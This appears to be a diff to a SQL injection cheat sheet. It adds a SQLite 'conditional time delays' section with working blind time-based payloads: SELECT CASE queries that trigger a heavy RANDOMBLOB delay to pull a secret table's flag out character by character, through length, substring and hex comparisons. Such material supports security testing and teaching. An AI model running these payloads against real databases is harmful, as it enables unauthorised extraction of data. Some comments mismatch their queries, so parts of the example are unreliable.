@@ -99,9 +99,26 @@ SELECT length(randomblob(900000000));
 ```
 
 * #### Conditional time delays
-You can test a single boolean condition and trigger a time delay if the condition is true.
+You can test a single boolean condition and trigger a time delay if the condition is true. syntax ``` select case when (<your query here>) then RANDOMBLOB(10000000) ELSE 2 end```.
+```
+#example
+/* create table secret (id int, flag varchar(50)) */
+/* insert into secret values(1, 'flag{sp34rh34d}') */
 
+/* This recover the first row from secret table and compare the length value if is greater than 5 */
+SELECT case WHEN (LENGTH((select flag from secret order by 1 LIMIT 0,1)) > 5) then RANDOMBLOB(10000000) ELSE 2 end
 
+/* This recover the first row from secret table and compare if the first char is equal to f */
+SELECT case WHEN (substr((select flag from secret order by 1 LIMIT 0,1),1,1) ='f') then RANDOMBLOB(10000000) ELSE 2 end
+
+/* This recover the first row from secret table and compare if the first char is equal to f */
+SELECT case WHEN (substr((select flag from secret order by 1 LIMIT 0,1),2,1) ='f') then RANDOMBLOB(10000000) ELSE 2 end
+
+/* This recover the first row from secret table and compare using hex value */
+SELECT case WHEN (hex(substr((select flag from secret order by 1 LIMIT 0,1),2,1)) ='6C') then RANDOMBLOB(10000000) ELSE 2 end
+SELECT case WHEN (hex(substr((select flag from secret order by 1 LIMIT 0,1),3,1)) =hex('a')) then RANDOMBLOB(10000000) ELSE 2 end
+
+```
 
 
 
